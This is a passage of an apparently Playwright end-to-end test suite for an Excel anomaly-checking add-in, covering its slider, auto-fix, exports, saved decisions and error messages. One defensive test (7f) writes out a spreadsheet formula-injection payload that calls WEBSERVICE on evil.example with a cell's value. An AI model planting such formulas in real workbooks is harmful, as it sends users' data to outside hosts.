  ok(listed0 <= listed5 && (await page.evaluate(() => __settings.anomalyHunterStrength)) === 0 && (await text("#strength-hint")).startsWith("Basics"),
    `strength 0 re-checks with the basics only (${listed5} -> ${listed0} rows), saved in the workbook`);
  ok(scans.at(-1).strength === 0 && scans.at(-2).strength === 5, "the slider's level is what the engine is sent (5, then 0)");
  const basics = await text("#flagged-list");
  // nosemgrep: detect-non-literal-regexp - test code, r is a fixed row number
  const has = (r) => new RegExp(`Row ${r}(?!\\d)`).test(basics);
  // row 22's 9999 stays listed, but only because its Total no longer adds up (a basic) - the statistics are gone
  ok([11, 22, 51, 81, 121].every(has) && basics.includes("does not add up") && !/limit of 105|pattern|jumped/.test(basics),
    "basics: minus sign, double entry, spelling, blank, a total that doesn't add up - not the statistics");
  // the bug John hit: a check is running (the track was just clicked) and he grabs the thumb - it must still drag,
  // and the level he lets go at is the one the sheet ends up checked with
  const s1 = scans.length;
  await page.click("#scan");
  ok((await page.evaluate(() => document.getElementById("scan").disabled)), "a check is running");
  await slide(0, 8);
  ok((await level()) === "8", "the thumb drags while a check runs");
  await page.waitForFunction(() => !document.getElementById("scan").disabled && __settings.anomalyHunterStrength === 8);
  await page.waitForTimeout(400); await idle();
  ok((await page.evaluate(() => __state.lastStrength)) === 8 && scans.at(-1).strength === 8, "the queued re-check ran with the newest level (8)");
  await page.waitForTimeout(800);
  ok(scans.slice(s1).map((b) => b.strength).join() === "0,8", "the running check, then exactly one re-check, at the level let go at - " + scans.slice(s1).map((b) => b.strength));
  const s2 = scans.length;
  await openLevel(); await page.focus("#strength"); await page.keyboard.press("ArrowLeft"); await page.keyboard.press("ArrowLeft"); await page.keyboard.press("ArrowLeft");
  ok((await level()) === "5", "arrow keys move it one step at a time");
  // capped wait: a pane that never checks 5 must fail the named check below, not stop the run on a timeout
  await page.waitForFunction(() => __state.lastStrength === 5 && !document.getElementById("scan").disabled, null, { timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(800); await idle();
  // the design (pages/strength.js): one check at a time, and a level chosen meanwhile gets exactly one more check, with
  // the newest level. The first key starts a check at 7 at once; the next two only queue one more, at 5; 6 is never checked
  // AH-228 P-27 (was "7,5": the first key checked at once): keys check once, a moment after the last one
  ok(scans.slice(s2).map((b) => b.strength).join() === "5" && (await page.evaluate(() => __settings.anomalyHunterStrength)) === 5,
    "three quick arrow keys: one check, at the newest level (5), and 5 saved - " + scans.slice(s2).map((b) => b.strength));
  { const m = await matchesEngine(); ok(m.ok, "at 5 the list is exactly what the engine answered at 5 - " + m.why); }
  ok((await page.$$("#flagged-list li")).length === listed5 && (await text("#strength-val")) === "5 of 10" && (await page.evaluate(() => __state.lastStrength)) === 5,
    "back to 5: the same rows as before");
  // AH-127: two slider steps while a check runs gave the sheet three checks, 5, 7 and 7: the second step queued a
  // re-check at the level the first one's re-check had already used
  const s3 = scans.length;
  await page.click("#scan");
  await openLevel(); await page.focus("#strength"); await page.keyboard.press("ArrowRight"); await page.keyboard.press("ArrowRight");
  await page.waitForFunction(() => __state.lastStrength === 7 && !document.getElementById("scan").disabled, null, { timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(1500); await idle();
  ok(scans.slice(s3).map((b) => b.strength).join() === "5,7", "two slider steps while a check runs: that check, then one at 7, never a second at 7 - " + scans.slice(s3).map((b) => b.strength));
  await page.keyboard.press("ArrowLeft"); await page.keyboard.press("ArrowLeft");
  await page.waitForFunction(() => __state.lastStrength === 5 && !document.getElementById("scan").disabled, null, { timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(800); await idle();
  ok((await text("#strength-val")) === "5 of 10" && (await page.evaluate(() => __settings.anomalyHunterStrength)) === 5, "and back to 5");

  // 6c) auto-fix (step 3): off by default; on = only the capitals/spaces slip, never numbers; Undo auto-fixes puts it back
  ok(!(await page.evaluate(() => document.getElementById("auto-fix").checked)), "auto-fix is off by default");
  ok(!(await page.evaluate(() => document.getElementById("power-bi").checked)), "the Power BI copy is off by default: no copy of the sheet is kept");
  const c3 = calls.length, openOption = (id) => page.locator(`details.more:has(#${id})`).evaluate((d) => (d.open = true));
  await openOption("auto-fix"); await page.click("#auto-fix"); // a person's click, as on the pane
  ok(calls.length === c3 && (await page.evaluate(() => localStorage.getItem("anomalyHunterAutoFix"))) === "1", "turning auto-fix on sends nothing and is kept on this PC");
  const w0 = await page.evaluate(() => __log.length);
  await page.click("#scan"); await idle();
  ok(since(c3) === "/scan,/scan" && (await page.evaluate((n) => __log.slice(n).map((w) => w[2]).join(), w0)) === "B81",
    "with auto-fix on, Find problems: a scan, only the exact slip written (B81), then one re-check - " + since(c3));
  ok((await cell("B81")).v === "East" && (await cell("C11")).v === -5 && (await cell("C22")).v === 7777 && (await text("#notice")).startsWith("Fixed 1 "),
    "auto-fix: only the spelling slip, never the numbers - " + (await text("#notice")));
  ok(!(await text("#flagged-list")).includes('"east "'), "checked again: the spelling slip is gone from the list (row 81 keeps only its other, unrelated flag)");
  ok(await page.isVisible("#undo-auto"), "Undo auto-fixes offered");
  await page.click("#undo-auto"); await idle();
  ok((await cell("B81")).v === "east " && !(await page.isVisible("#undo-auto")) && (await text("#notice")).startsWith("Put back 1 "), "Undo auto-fixes puts it back");
  ok((await cell("B81")).v === "east ", "and the re-check after Undo doesn't auto-fix it again");
  await page.click("#scan"); await idle(); // auto-fix again, then another record slides into row 81 (a sort)
  const a81 = (await cell("A81")).v;
  await page.evaluate(() => __edit("Sales", "A81", 99999));
  await page.click("#undo-auto"); await idle();
  ok((await cell("B81")).v === "East" && (await text("#notice")).includes("left alone"), "Undo auto-fixes never writes into a row that moved - " + (await text("#notice")));
  await page.evaluate((v) => { __edit("Sales", "A81", v); __edit("Sales", "B81", "east "); }, a81);
  await page.evaluate(() => { const c = document.getElementById("auto-fix"); c.checked = false; c.dispatchEvent(new Event("change")); });

  // 6d) Power BI: off = nothing on disk; on = both files, holding exactly the rows the pane lists; off again = deleted
  const powerBi = (on) => page.evaluate((on) => { const c = document.getElementById("power-bi"); c.checked = on; c.dispatchEvent(new Event("change")); }, on);
  ok(!fs.existsSync(CSV) && !fs.existsSync(FLAGS) && scans.every((b) => b.power_bi === false), "Power BI off: the engine is told so and no copy is on disk");
  const c4 = calls.length;
  await openOption("power-bi"); await page.click("#power-bi");
  ok(calls.length === c4 && (await page.evaluate(() => localStorage.getItem("anomalyHunterPowerBi"))) === "1", "turning Power BI on sends nothing by itself and is kept on this PC");
  await find();
  ok(scans.at(-1).power_bi === true && scans.at(-1).sheet === "Sales" && scans.at(-1).start_row === 0, "Power BI on: sent with where the table sits");
  const paneRows = await page.$$eval("#flagged-list button", (bs) => bs.map((b) => +/^Row (\d+)/.exec(b.innerText)[1]).sort((a, b) => a - b));
  const flagsCsv = records(FLAGS), scanCsv = records(CSV);
  const csvRows = flagsCsv.slice(1).map((r) => +r[2]).sort((a, b) => a - b);
  ok(flagsCsv[0].join() === "Scanned At,Sheet,Excel Row,Severity,Bucket,Reason,Suggested Fix,Magnitude,Status" && flagsCsv.slice(1).every((r) => r[1] === "Sales"),
    "latest-flags.csv has its fixed columns and the sheet's name");
  ok(paneRows.length > 0 && JSON.stringify(csvRows) === JSON.stringify(paneRows), `latest-flags.csv holds exactly the rows the pane lists (${paneRows})`);
  const r11 = scanCsv.find((r) => r[0] === "11");
  ok(scanCsv.length === 301 && scanCsv[0].slice(0, 6).join() === "Excel Row,OrderDate,Region,Units,UnitCost,Total" && r11[3] === "-5"
    && r11[6] === "Medium" && /Units: -5 → /.test(r11[9]) && r11[11] === "Open", "latest-scan.csv: every row, Excel's row numbers, row 11's -5, its suggested fix, Status Open - " + r11);

  // 6e) Fixed and Dismissed outlive the pane: kept in the workbook, they come back after a reload (the pane closed and
  // opened again) and every re-scan, a sort keeps them, Power BI's Status shows them, and Undo takes its decision out.
  // They lived in the pane's memory: a dismissed row came back flagged, an accepted fix vanished (John, 2026-10-20)
  const tag = (r) => page.locator(`#flagged-list button:has-text("Row ${r} ") .sev`).textContent({ timeout: 2000 }).catch(() => null);
  const kept = () => page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).sort().join());
  ok((await tag(22)) === "Dismissed", "row 22, dismissed in step 3, is still Dismissed after every re-scan since - " + (await tag(22)));
  await openRow(11); await page.click("#fix-apply"); await idle();
  ok((await kept()) === "dismissed,fixed", "the workbook keeps one code per decision, never the values - " + (await kept()));
  const s6 = scans.length;
  const book = await page.evaluate(() => JSON.stringify(__settings.anomalyHunterDecisions));
  ok(/^\{"Sales":\{("[0-9a-z]{1,11}\.\d+":"(fixed|dismissed)",?){2}\}\}$/.test(book), "only codes, never a cell value - " + book);
  await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" });
  ok((await cell("C11")).v !== -5, "the reloaded pane sees the same workbook (the fix is in the cell)");
  // AH-157: the reopened pane says its last check at once, with no scan: from the numbers the workbook keeps, never a
  // value or a reason (it opened on "Click Find problems" as if the sheet had never been checked)
  { const last = await page.evaluate(() => ({ said: document.getElementById("last-scan")?.checkVisibility() && document.getElementById("last-scan").textContent,
      keys: Object.keys(__settings.anomalyHunterLastScan || {}).sort().join() }));
    const r = replies.at(-1).rows, sure = r.filter((x) => x.severity === "High" || x.severity === "Medium").length;
    ok(last.keys === "at,high,level,low,medium,rows,sheet" && new RegExp(`^Last check on Sales, \\d+ [A-Z][a-z]{2}: ${sure} of 300 rows looked wrong`).test(last.said) && scans.length === s6,
      `AH-157: reopened, the pane says the last check before any scan, from its numbers only - ${JSON.stringify(last)}, ${scans.length - s6} scans`);
    // its picture at rest: once the entrance has played (only when pictures are asked for)
    if (process.env.SHOTS) await page.waitForFunction(() => [...document.querySelectorAll("[data-enter]")].every((e) => !e.style.opacity && !e.style.transform)
      && document.getAnimations().every((a) => a.playState !== "running"), null, { timeout: 5000 }).catch(() => {});
    await shot("last-scan"); }
  await find();
  ok((await tag(11)) === "Fixed" && (await tag(22)) === "Dismissed", `after a reload: row 11 Fixed, row 22 Dismissed - ${await tag(11)}, ${await tag(22)}`);
  ok((await cell("C22")).fill === null && (await cell("C11")).fill === null && (await cell("A51")).fill === "#FFEB9D",
    "a decided row is not highlighted again; the others are - " + JSON.stringify([await cell("C22"), await cell("C11"), await cell("A51")]));
  ok(/2 of \d+ done/.test(await text("#list-title")), "and counted done - " + (await text("#list-title")));
  await contrast("the list with a Fixed and a Dismissed row");
  // AH-118: Accept's Undo outlives the pane too. It lived only in the pane's memory, so after a reload the fixed row only
  // selected itself ("Undo is only offered right after a fix") and the user's old value was gone from reach
  ok(await page.evaluate(() => (__settings.anomalyHunterAcceptUndo || []).some((u) => u.sheet === "Sales" && u.cells.some((c) => c[0] === "C11" && c[1] === -5))),
    "Accept keeps its Undo (the old value) in the workbook");
  await openRow(11);
  ok((await text("#fix-title")) === "Row 11: fixed" && (await page.isVisible("#fix-undo")) && (await text("#fix-changes")).startsWith("C11: -5 → "),
    "after a reload the fixed row's card still offers Undo - " + (await text("#fix-title")) + " / " + (await text("#fix-changes")));
  await page.click("#fix-undo"); await idle();
  ok((await cell("C11")).v === -5 && (await text("#fix-status")).startsWith("Undone.") && (await kept()) === "dismissed"
    && !(await page.evaluate(() => (__settings.anomalyHunterAcceptUndo || []).some((u) => u.sheet === "Sales"))),
    "and Undo after a reload puts the old value back, takes the Fixed out and forgets the old value - " + (await text("#fix-status")) + " / " + (await kept()));
  await page.click("#fix-apply"); await idle(); // fixed again, for the steps below
  ok((await cell("C11")).v !== -5 && (await kept()) === "dismissed,fixed", "Accept again after that Undo - " + (await kept()));
  await back();
  // a fixed row whose old values the workbook no longer holds (Forget, or another PC's pane) only selects its row
  await page.evaluate(() => { window.__keptUndo = __settings.anomalyHunterAcceptUndo; delete __settings.anomalyHunterAcceptUndo; }); await find();
  await page.click('#flagged-list button:has-text("Row 11 ")'); await idle();
  ok(await page.isVisible("#results") && (await text("#notice")).includes("its old values are no longer kept"), "a row fixed with no Undo kept only selects its row, and says why - " + (await text("#notice")));
  await page.evaluate(() => { __settings.anomalyHunterAcceptUndo = window.__keptUndo; }); // back, for Forget (6g) to find
  await openRow(22);
  ok((await text("#fix-title")).startsWith("Row 22") && (await page.isVisible("#fix-apply")), "a dismissed row's card still opens from the list, so it can still be fixed");
  await back();
  const flagsNow = records(FLAGS), statusOf = (r) => flagsNow.find((x) => x[2] === String(r))?.[8];
  ok(statusOf(11) === "Fixed" && statusOf(22) === "Dismissed" && statusOf(51) === "Open", `latest-flags.csv: Status Fixed, Dismissed, Open (${statusOf(11)}, ${statusOf(22)}, ${statusOf(51)})`);
  const swap = () => page.evaluate(() => { for (const c of "ABCDE") { const a = __cell("Sales", c + "22").v, b = __cell("Sales", c + "23").v; __edit("Sales", c + "22", b); __edit("Sales", c + "23", a); } });
  await swap(); await find(); // a sort moves the dismissed record down one row
  ok((await tag(23)) === "Dismissed" && (await tag(22)) === null, `a sort keeps the decision with its record (row 23 now) - ${await tag(23)}, ${await tag(22)}`);
  await swap();
  await openRow(81); await page.click("#fix-apply"); await idle(); // a fix accepted, then undone: its decision goes
  ok((await kept()) === "dismissed,fixed,fixed", "Accept keeps a decision - " + (await kept()));
  await page.click("#fix-undo"); await idle();
  ok((await kept()) === "dismissed,fixed" && (await cell("B81")).v === "east ", "Undo takes it back out - " + (await kept()));
  await back(); // AH-165: Find problems is out of the way while a card is open
  await powerBi(false); await find();
  ok(!fs.existsSync(CSV) && !fs.existsSync(FLAGS), "Power BI turned off: the next scan deletes both copies");

  // 6f) the footer's Privacy and Support links open their pages from the engine
  for (const link of ["Privacy", "Support"]) {
    const [pop] = await Promise.all([page.waitForEvent("popup"), page.click(`#pane-footer .pf-links a:has-text("${link}")`)]);
    await pop.waitForLoadState();
    const status = await pop.evaluate(() => performance.getEntriesByType("navigation")[0].responseStatus);
    ok(status === 200 && (await pop.title()) === `Arcas, ${link}`, `${link} link opens its page (HTTP ${status})`);
    await pop.close();
  }

  // 6g) "Forget what this workbook saved": every key the pane keeps in the workbook goes, and no cell changes. They stayed
  // in the file after an uninstall, and nothing in the pane could clear them (AH-87). A limit and the decisions of 6e
  // (row 22 dismissed, row 11 fixed) are there first
  await openStrict(); await page.click("#edit-limits");
  await page.locator('#limits-rows .limits-row[data-column="Units"] input').nth(1).fill("10000"); await page.click("#save-limits"); await idle();
  const BOOK = ["anomalyHunterLimits", "anomalyHunterStrength", "anomalyHunterAutoUndo", "anomalyHunterAcceptUndo", "anomalyHunterDecisions", "Office.AutoShowTaskpaneWithDocument", "anomalyHunterHighlights", "anomalyHunterLastScan"];
  const held = () => page.evaluate((ks) => ks.filter((k) => __settings[k] !== undefined && __settings[k] !== null), BOOK);
  const sheetNow = () => page.evaluate(() => { const out = []; for (let r = 1; r <= 301; r++) for (const c of "ABCDE") out.push(__cell("Sales", c + r)); return JSON.stringify(out); });
  const heldBefore = await held(), cellsBefore = await sheetNow(), wrote0 = await page.evaluate(() => __log.length);
  ok(heldBefore.includes("anomalyHunterLimits") && heldBefore.includes("anomalyHunterDecisions") && heldBefore.includes("anomalyHunterAcceptUndo"), "a limit, decisions and Accept's Undo are in the workbook first - " + heldBefore);
  await page.locator("details.more:has(#forget-book)").evaluate((d) => (d.open = true));
  // a double-click: it ran Forget twice and ended on "This workbook holds nothing Arcas saved." (AH-127)
  await doubleClick("#forget-book"); await idle(); await page.waitForTimeout(400);
  const forgot = await text("#forget-state");
  ok((await held()).length === 0 && forgot.startsWith("Removed from this workbook: the limits you changed;") && forgot.includes("the codes of the rows you fixed or dismissed")
    && (await page.evaluate((n) => __log.length === n, wrote0)), "Forget, double-clicked, runs once: removes every key the pane saved, says which, and writes no cell - " + forgot);
  const book0 = await page.evaluate(() => JSON.stringify(__settings)), local0 = await page.evaluate(() => JSON.stringify(Object.entries(localStorage).sort()));
  await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" });
  ok((await held()).length === 0 && (await sheetNow()) === cellsBefore && !(await page.isVisible("#last-scan")), "after a reload the workbook holds none of them, says no last check, and every cell is as it was");
  // AH-169: Before you scan. On opening, the pane says what the sheet looks like and what a scan will check, each of the
  // engine's /profile lines on its own line, from the header and at most the first 500 rows read on this PC, and it saves
  // nothing in the workbook or on this PC. A scan takes its place
  { await profiled();
    const said = await page.$$eval("#before-scan-lines p", (ps) => ps.map((p) => p.textContent)), sent = calls.filter((c) => c[0] === "/profile").at(-1)?.[1];
    ok(await page.isVisible("#before-scan") && (await text("#before-scan-head")) === "Before you scan" && said[0] === "Each row is a date in OrderDate."
      && said.includes("No column about people, so the fairness check is off.") && said.includes("Dates are in OrderDate.") && JSON.stringify(said) === JSON.stringify(profiles.at(-1)?.lines)
      && sent?.rows.length === 300 && JSON.stringify(sent.columns) === JSON.stringify(rows[0]),
      "Before you scan: on opening the pane says the engine's /profile lines for the sheet, one a line - " + JSON.stringify(said));
    // AH-193: its first line is a sentence: the empty state's heading rule (#empty-state p:first-child) balanced it like
    // a heading ("This sheet looks like a / time series by OrderDate."); the empty state's own first line keeps it
    const wrap = await page.evaluate(() => ["#before-scan-lines p", "#empty-state > p"].map((q) => getComputedStyle(document.querySelector(q)).getPropertyValue("text-wrap-style")));
    ok(wrap[0] !== "balance" && wrap[1] === "balance", "AH-193: a line of Before you scan wraps as a sentence, never balanced like the heading above it - " + JSON.stringify(wrap));
    ok((await page.evaluate(() => JSON.stringify(__settings))) === book0 && (await page.evaluate(() => JSON.stringify(Object.entries(localStorage).sort()))) === local0,
      "and saves nothing in the workbook or on this PC - " + (await page.evaluate(() => Object.keys(__settings))));
    await contrast("the empty state with Before you scan");
    // a sheet longer than 500 rows: only its header and first 500 rows are read and sent
    await page.evaluate((rows) => __load("Long", [rows[0], ...Array.from({ length: 700 }, (_, k) => rows[1 + (k % 300)])], [0]), rows);
    await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" }); await profiled();
    ok(calls.filter((c) => c[0] === "/profile").at(-1)?.[1].rows.length === 500, "on a 700-row sheet it sends the header and the first 500 rows only");
    await page.evaluate(() => { __drop("Long"); __activate("Sales"); });
    await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" }); await profiled();
    // AH-193 fix round: opened on this 300-row sheet, its lines landed about 150 ms after the main view and grew the box
    // 33 px past its held height, pushing the options and the footer down (CLS 0.0156, the measurer's pane-shift.mjs):
    // from the first paint to the lines in place, nothing moves
    await page.waitForFunction(() => [...document.querySelectorAll("[data-enter]")].every((e) => !e.style.opacity && !e.style.transform), null, { timeout: 5000 });
    await page.waitForTimeout(300);
    const moved = await page.evaluate(() => window.__shift);
    ok(moved === 0, `AH-193: opened on a 300-row sheet, Before you scan lands with the main view and nothing moves (layout shift ${moved})`);
  }
  await find();
  ok(await page.$eval("#before-scan", (e) => e.hidden), "a scan takes the place of Before you scan");
  ok((await tag(22)) === "Probably wrong" && (await text("#strength-val")) === "5 of 10" && (await text("#flagged-list")).includes("Units is 7777"),
    `the next scan: row 22 is no longer Dismissed, the slider is back at 5, the automatic limits are used - ${await tag(22)}`);
  await page.locator("details.more:has(#forget-book)").evaluate((d) => (d.open = true));
  await page.click("#forget-book"); await idle(); // the scan saved the pane's opening setting and its highlights' old fills again: only those go now
  ok((await text("#forget-state")) === "Removed from this workbook: the setting that opens this pane with the file; the colours your highlighted cells had before; the numbers of the last check. Your cells are as they were. Save the workbook to keep the change in the file; the next scan saves the setting that opens this pane again.",
    "a second Forget names only what was there - " + (await text("#forget-state")));
}

// AH-209: flow mode's second half, a mode of its own. All of it ran in 145 s here against e2e/all.sh's 150 s limit;
// from 7a on each step loads its own sheet or reloads, so it starts as well from a freshly opened Sales sheet
if (mode === "flow2") {
  // 7a) 30 scans and re-checks: what the pane keeps (listeners, page nodes) stays what is on screen (AH-13). Counted by
  // Chromium itself after a forced garbage collection, so a leaked list or a listener added per scan shows up
  const cdp = await page.context().newCDPSession(page);
  // counted at rest: since AH-149 a list's rows fade in and the summary counts up, and a list replaced mid-fade is held by
  // its animation until it ends (under 1 s), then released
  const counters = async () => { await page.waitForFunction(() => document.getAnimations().every((a) => a.timeline !== document.timeline || a.playState !== "running"), null, { timeout: 5000 });
    await cdp.send("HeapProfiler.collectGarbage"); return cdp.send("Memory.getDOMCounters"); };
  await find();
  // counted with $$eval: an element handle (page.$$) keeps its node alive, and 5 of them read as a leak of 5 rows
  const rowsShown = () => page.$$eval("#flagged-list li", (lis) => lis.length);
  const dom0 = await counters(), shownBefore = await rowsShown();
  for (let k = 0; k < 20; k++) await find();
  await openLevel(); await page.focus("#strength");
  for (let k = 0; k < 10; k++) { // 6, 5, 6, 5...: each a re-check, ending back at 5
    const to = k % 2 ? 5 : 6;
    await page.keyboard.press(to === 6 ? "ArrowRight" : "ArrowLeft");
    await page.waitForFunction((to) => __state.lastStrength === to && !document.getElementById("scan").disabled, to, { timeout: 15000 }).catch(() => {});
    await idle();
  }
  const dom30 = await counters(), shownAfter = await rowsShown();
  ok(dom30.jsEventListeners <= dom0.jsEventListeners && dom30.nodes <= dom0.nodes + 20 && dom30.documents <= dom0.documents
    && shownAfter === shownBefore && shownAfter <= 51 && (await page.evaluate(() => __handlers("Sales"))) === 1,
    `30 scans and re-checks: listeners, page nodes and the list stay as they were - before ${JSON.stringify(dom0)}, after ${JSON.stringify(dom30)}, rows ${shownBefore} -> ${shownAfter}`);

  // 7) rescans don't stack click-watchers; a second sheet takes the watcher over
  await find(); await find();
  ok(await page.evaluate(() => __handlers("Sales")) === 1, "rescans don't stack selection handlers");
  await page.evaluate((rows) => __load("Other", rows, [0]), rows);
  await find();
  ok(await page.evaluate(() => __handlers("Sales") === 0 && __handlers("Other") === 1), "watcher moved to the newly checked sheet");

  // 7b) an engine error reaches the user in the engine's own plain words, and the buttons come back
  await page.route("**/scan", (r) => r.fulfill({ status: 500, contentType: "application/json", body: JSON.stringify({ error: BROKE }) }), { times: 1 });
  const seen = errors.length;
  await page.click("#scan"); await idle();
  const planned = (e) => /status of 500|hit a problem it didn't expect/.test(e); // this step's own 500, logged on purpose
  errors.splice(seen, Infinity, ...errors.slice(seen).filter((e) => !planned(e)));
  ok((await text("#notice")) === BROKE && !(await page.evaluate(() => document.getElementById("clear-highlights").disabled)),
    "an engine error is said in plain words, and the pane is usable again - " + (await text("#notice")));

  // 7c) the engine goes down mid-scan (the request is sent, then the connection drops): plain words that name the file
  // most people have (the exe; install.bat only in a source folder or an invite kit), and the pane is usable again
  await failing(DROPPED, async () => { await page.route("**/scan", dropMidway, { times: 1 }); await page.click("#scan"); await idle(); });
  ok((await text("#notice")) === DOWN && (await page.isVisible("#main-ui")) && !(await page.evaluate(() => document.getElementById("scan").disabled)),
    "the engine down mid-scan: said in plain words, buttons back - " + (await text("#notice")));
  // an engine from before a route existed answers 404 with no words of ours: told to update, naming the exe too
  await failing(/status of 404|out of date/, async () => { await page.route("**/scan", (r) => r.fulfill({ status: 404, body: "" }), { times: 1 }); await page.click("#scan"); await idle(); });
  ok((await text("#notice")) === "The checker is out of date. Close Excel, then run the newest Arcas.exe (from a source folder: install.bat).",
    "an engine too old for the pane: said in plain words - " + (await text("#notice")));
  // and mid-Accept (on the Other sheet, checked last): the cell is written, the re-check that could not run is said on the card
  await find(); await openRow(81);
  await failing(DROPPED, async () => { await page.route("**/check", dropMidway, { times: 1 }); await page.click("#fix-apply"); await idle(); });
  ok((await text("#fix-status")) === `Accepted. Couldn't check it again (${DOWN}). Click Find problems to check the sheet.` && (await page.evaluate(() => __cell("Other", "B81").v)) === "East",
    "the engine down mid-Accept: the fix is in, and the card says the re-check couldn't run - " + (await text("#fix-status")));
  await page.click("#fix-undo"); await idle(); await back();

  // 7d) AH-110: Excel's and the browser's own words never reach the screen. "Something went wrong:
  // InvalidOperationInCellEditMode" (a cell being typed in) and "Something went wrong: Cannot read properties of
  // undefined (reading 'values')" were shown as they came
  const internal = /InvalidOperation|CellEditMode|ItemNotFound|TypeError|undefined|Cannot read|properties|reading '/;
  await failing(/InvalidOperationInCellEditMode/, async () => { await page.evaluate(() => (window.__cellEdit = 1)); await page.click("#scan"); await idle(); });
  ok((await text("#notice")) === "Excel is busy editing a cell. Press Enter or Esc, then try again.", "a scan while a cell is being typed in: Excel's code said in plain words - " + (await text("#notice")));
  await failing(/Cannot read properties/, async () => { await page.evaluate(() => (window.__typeError = 1)); await page.click("#scan"); await idle(); });
  const said7d = await text("#notice");
  ok(said7d.startsWith("Something went wrong. ") && !internal.test(said7d) && !(await page.evaluate(() => document.getElementById("scan").disabled)),
    "a script error: one plain sentence, no internal word, and the pane usable again - " + said7d);
  await find(); // the list of the Other sheet; then the sheet is deleted under it
  await page.evaluate(() => __drop("Other"));
  await failing(/ItemNotFound/, async () => { await page.click('#flagged-list button:has-text("Row 81 ")'); await idle(); });
  const gone7d = await text("#notice");
  ok(/^The sheet or cells this was about are gone\b.*Find problems/.test(gone7d) && !internal.test(gone7d), "a sheet deleted under its list: said in plain words - " + gone7d);
  ok(await page.isVisible("#results") && await page.isVisible("#scan"), "AH-165: and the list is back, with the Find problems it names (a card hides it)");

  // 7e) AH-149 review: a failed Accept or Undo is said once, in the card's notice box. It was said on the card's status
  // line and, thrown on to act(), in #notice above the list too. A sheet of its own: Other is gone and Sales holds decisions
  await page.evaluate((rows) => __load("Busy", rows, [0]), rows);
  await find(); await openRow(11);
  const saidAt = () => page.evaluate(() => ["notice", "fix-status", "fix-care"].map((id) => { const p = document.getElementById(id); return p.checkVisibility() ? p.textContent : ""; }));
  const c11 = () => page.evaluate(() => __cell("Busy", "C11").v);
  await failing(/InvalidOperationInCellEditMode/, async () => { await page.evaluate(() => (window.__cellEdit = 1)); await page.click("#fix-apply"); await idle(); });
  const accept7e = await saidAt();
  ok(JSON.stringify(accept7e) === JSON.stringify(["", "", "Excel is busy editing a cell. Press Enter or Esc, then try again."]) && (await c11()) === -5
    && (await page.isVisible("#fix-apply")) && (await page.isEnabled("#fix-apply")),
    "a failed Accept: said once, in the card's notice box, nothing written, Accept ready again - " + JSON.stringify(accept7e));
  await page.click("#fix-apply"); await idle();
  ok((await c11()) !== -5 && !(await page.isVisible("#fix-care")) && (await page.isVisible("#fix-undo")), "Accept again: the fix is in and the failure leaves the card");
  await failing(/Cannot read properties/, async () => { await page.evaluate(() => (window.__typeError = 1)); await page.click("#fix-undo"); await idle(); });
  const undo7e = await saidAt();
  ok(undo7e[0] === "" && undo7e[1] === "" && undo7e[2].startsWith("Undo failed. ") && !internal.test(undo7e[2]) && (await c11()) !== -5
    && (await page.isVisible("#fix-undo")) && (await page.isEnabled("#fix-undo")),
    "a failed Undo: said once, in the card's notice box, the fix still in, Undo ready again - " + JSON.stringify(undo7e));
  await page.click("#fix-undo"); await idle();
  ok((await c11()) === -5 && !(await page.isVisible("#fix-care")), "Undo again: the cells are back and the failure leaves the card");
  await page.click("#fix-back");

  // 7f) AH-160: a label typed as a formula with a full-width ＝ (Excel reads it as =) got a capitals fix, and auto-fix
  // wrote ＝WEBSERVICE(...) into the sheet with no Accept. The engine offers no such fix, so auto-fix writes nothing
  const evil = (w) => `＝${w}("https://evil.example/?"&A2)`;
  await page.evaluate((rows) => __load("Evil", rows), [["Label", "N"], ...Array.from({ length: 10 }, (_, k) => [evil("WEBSERVICE"), k]),
    [evil("webservice"), 10], ...Array.from({ length: 10 }, (_, k) => ["Other", 11 + k])]);
  await page.evaluate(() => localStorage.setItem("anomalyHunterAutoFix", "1"));
  const w7f = await page.evaluate(() => __log.length);
  await page.click("#scan"); await idle();
  await page.evaluate(() => localStorage.setItem("anomalyHunterAutoFix", "0"));
  ok((await page.evaluate((n) => __log.slice(n).filter((w) => w[0] === "write" && w[1] === "Evil").length, w7f)) === 0
    && (await page.evaluate(() => __cell("Evil", "A12").v)) === evil("webservice"),
    "auto-fix never writes a label Excel would read as a formula - " + (await text("#notice")));

  // 8) an empty sheet gets a plain message, not an error
  await page.evaluate(() => __load("Empty", [["only a header"]]));
  await page.click("#scan"); await idle();
  ok((await text("#notice")).startsWith("Not enough data here."), "empty sheet explained");

  // 8a) AH-150: a column holds dates when most of its first cells say so: a sort that put a text in row 2 sent the whole
  // OrderDate column as serial numbers
  await page.evaluate((rows) => { __load("Sorted", [rows[0], ["unknown", ...rows[1].slice(1)], ...rows.slice(2, 60)], [0]);
    return Excel.run(async (ctx) => { ctx.workbook.worksheets.getItem("Sorted").getRange("A2").numberFormat = [["General"]]; }); }, rows);
  await find();
  { const sent = scans.at(-1).rows.map((r) => r[0]);
    ok(sent[0] === "unknown" && sent.slice(1).every((d) => /^\d{4}-\d\d-\d\d$/.test(d)), "a date column with a text in row 2 is still sent as dates - " + sent.slice(0, 3)); }

  // 8b) AH-111: a sheet with nothing wrong says so and shows no list. Under "No problems found in 60 rows." it showed
  // "Worst first. Click a row to see what's wrong...", an empty framed list and Remove highlights. The next scan that
  // flags rows brings them back
  const listBits = () => page.evaluate(() => ["list-hint", "flagged-list", "clear-highlights", "list-title"].map((id) => document.getElementById(id)?.checkVisibility() ? id : "").filter(Boolean).join());
  await page.evaluate(() => __load("Clean", [["Item", "Units", "Cost"], ...Array.from({ length: 60 }, (_, k) => [["Pen", "Pad", "Ink"][k % 3], 40 + ((k * 7) % 23), +(1.99 + (k % 4)).toFixed(2)])]));
  await find();
  ok(/^No problems found in 60 rows\. Checked in \d+ seconds?\.$/.test(await text("#summary")) && (await listBits()) === "", "a clean sheet: the summary alone, no hint, no empty list, no Remove highlights - " + (await listBits()));
  ok(await page.evaluate(() => document.getElementById("summary").classList.contains("tick") && getComputedStyle(document.getElementById("summary"), "::after").animationIterationCount === "1"),
    "AH-149: a sheet with no problem ends on a check mark, drawn once");
  await page.evaluate(() => __activate("Sales")); await find();
